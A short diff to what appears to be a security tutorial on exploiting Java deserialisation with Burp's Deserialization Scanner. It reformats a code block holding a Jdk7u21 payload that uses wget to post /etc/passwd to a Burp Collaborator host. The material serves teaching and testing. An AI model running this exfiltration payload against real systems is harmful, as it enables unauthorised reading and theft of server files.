@@ -168,7 +168,9 @@ Step 1: Send the vulnerable request to **DS - Exploitation Tab**
 
 Step 2: Using the following command to perform a **OOB Deserialisation** and Read Internal Files of the application
 
-```bash Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net"```
+```bash
+Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net"
+```
 
 <p align="center">
   <img src="/images/deserialisation/desc19.png">
